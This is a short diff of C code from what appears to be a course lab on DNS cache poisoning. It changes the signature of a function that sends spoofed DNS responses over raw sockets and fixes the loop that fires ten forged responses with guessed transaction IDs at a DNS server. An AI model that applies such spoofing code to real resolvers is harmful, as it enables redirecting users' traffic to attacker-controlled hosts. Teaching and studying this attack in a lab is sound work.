@@ -83,7 +83,7 @@ int build_dns_response(unsigned char *buffer, unsigned char *query, int query_le
 }
 
 // Function to send a spoofed DNS response using raw sockets
-void send_spoofed_dns_response(const char *hostname, uint32_t txid, const char *destination_ip, int destination_port, uint32_t source_ip) {
+void send_spoofed_dns_response(uint32_t txid, const char *destination_ip, int destination_port, uint32_t source_ip) {
     int sockfd;
     unsigned char buffer[BUFFER_SIZE];
 
@@ -270,7 +270,7 @@ void run_attack(uint32_t *txid_ls) {
     printf("source port : %u\n", source_port);
     fill_txids(txid_ls, txid);
     for (int i = 0; i < 10; i++) {
-        send_spoofed_dns_response("www.example.cybercourse.com", txid_ls[i], DNS_SERVER_IP, source_port, txid_ls[i], inet_addr("192.168.1.204"));
+        send_spoofed_dns_response(txid_ls[i], DNS_SERVER_IP, source_port, inet_addr("192.168.1.204"));
         printf("sent spoofed response %d with txid %u\n", i, txid_ls[i]);
     }
     
